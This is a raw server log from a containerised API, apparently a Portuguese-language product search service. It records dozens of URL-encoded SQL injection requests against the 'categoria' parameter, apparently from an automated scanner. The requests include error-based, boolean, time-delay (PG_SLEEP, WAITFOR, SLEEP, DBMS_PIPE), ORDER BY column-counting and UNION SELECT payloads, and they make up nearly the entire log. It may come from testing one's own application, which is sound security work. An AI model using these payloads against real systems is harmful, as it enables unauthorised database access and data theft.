api-1  | Servidor rodando em http://0.0.0.0:8000
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F2617%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282617%3D2617%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%289002%3D9002 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2617%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282617%3D2617%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2617%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282617%3D2617%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29--%2F%2A%2A%2FygYP HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F6938%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286938%3D6938%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27pURh%27%3D%27pURh HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F6938%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286938%3D6938%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27iBIC%27%3D%27iBIC HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F6938%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286938%3D6938%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%283397%3D3397 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F6938%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286938%3D6938%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F6938%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286938%3D6938%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--%2F%2A%2A%2FUEoe HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F3722%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283722%3D3722%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27NXjj%27%3D%27NXjj HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F3722%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283722%3D3722%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27vWgS%27%3D%27vWgS HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F3722%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283722%3D3722%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284642%3D4642 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3722%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283722%3D3722%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3722%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283722%3D3722%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29--%2F%2A%2A%2FmTgB HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=%28SELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qxxvq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281789%3D1789%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qkxxq%27%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2875%29%7C%7CCHR%28113%29%7C%7CCHR%2866%29%7C%7CCHR%2866%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2875%29%7C%7CCHR%28113%29%7C%7CCHR%2866%29%7C%7CCHR%2866%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2875%29%7C%7CCHR%28113%29%7C%7CCHR%2866%29%7C%7CCHR%2866%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2875%29%7C%7CCHR%28113%29%7C%7CCHR%2866%29%7C%7CCHR%2866%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F7361%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29RuAi%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27ZUjd%27%3D%27ZUjd HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F7361%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29RuAi%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27cZJY%27%3D%27cZJY HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F7361%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29RuAi%29%2F%2A%2A%2FAND%2F%2A%2A%2F%281549%3D1549 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F7361%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29RuAi%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F7361%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29RuAi%29--%2F%2A%2A%2FrSoF HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F9789%3D%28SELECT%2F%2A%2A%2F9789%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27woqa%27%3D%27woqa HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F9789%3D%28SELECT%2F%2A%2A%2F9789%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27MGTz%27%3D%27MGTz HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F9789%3D%28SELECT%2F%2A%2A%2F9789%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%289930%3D9930 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9789%3D%28SELECT%2F%2A%2A%2F9789%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9789%3D%28SELECT%2F%2A%2A%2F9789%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29--%2F%2A%2A%2FucRi HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27nZUY%27%3D%27nZUY HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%27uViz%27%3D%27uViz HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%281122%3D1122 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--%2F%2A%2A%2FAoyV HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F3797%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2872%29%7C%7CCHR%2872%29%7C%7CCHR%2873%29%7C%7CCHR%2875%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27OQal%27%3D%27OQal HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F3797%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2872%29%7C%7CCHR%2872%29%7C%7CCHR%2873%29%7C%7CCHR%2875%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27dbQi%27%3D%27dbQi HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F3797%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2872%29%7C%7CCHR%2872%29%7C%7CCHR%2873%29%7C%7CCHR%2875%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%285596%3D5596 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3797%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2872%29%7C%7CCHR%2872%29%7C%7CCHR%2873%29%7C%7CCHR%2875%29%2C5%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3797%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2872%29%7C%7CCHR%2872%29%7C%7CCHR%2873%29%7C%7CCHR%2875%29%2C5%29--%2F%2A%2A%2FZqGG HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FVBcz HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FgqQO HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F7133--%2F%2A%2A%2Fzoyw HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F10--%2F%2A%2A%2FpxUK HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F6--%2F%2A%2A%2FSAld HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F4--%2F%2A%2A%2FHJOb HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F5--%2F%2A%2A%2FNnVL HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CCONCAT%28CONCAT%28%27qxxvq%27%2C%27cdAmHHiSgDVcYJAjZpWsJJWsVnhbplgREJLSQxwr%27%29%2C%27qkxxq%27%29%2CNULL--%2F%2A%2A%2FtiXx HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CCONCAT%28CONCAT%28%27qxxvq%27%2C%27cdAmHHiSgDVcYJAjZpWsJJWsVnhbplgREJLSQxwr%27%29%2C%27qkxxq%27%29%2CNULL%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CCONCAT%28CONCAT%28%27qxxvq%27%2C%27tJvNkaSyhtxEYmtiKCvFfBjlkxmyVwMunRQUaDdK%27%29%2C%27qkxxq%27%29%2CNULL--%2F%2A%2A%2FxTcT HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CCONCAT%28CONCAT%28%27qxxvq%27%2C%27cdAmHHiSgDVcYJAjZpWsJJWsVnhbplgREJLSQxwr%27%29%2C%27qkxxq%27%29%2CNULL%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F0%2F%2A%2A%2FAS%2F%2A%2A%2Fxtrn%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F2%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F3%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F4%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F5%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F6%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F7%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F8%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F9%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F10%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F11%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F12%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F13%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F14%29%2F%2A%2A%2FAS%2F%2A%2A%2Flzys--%2F%2A%2A%2Fuugv HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CCONCAT%28CONCAT%28%27qxxvq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2825%3D25%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qkxxq%27%29%2CNULL--%2F%2A%2A%2FVdda HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CCONCAT%28CONCAT%28%27qxxvq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2825%3D28%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qkxxq%27%29%2CNULL--%2F%2A%2A%2FHGUv HTTP/1.1
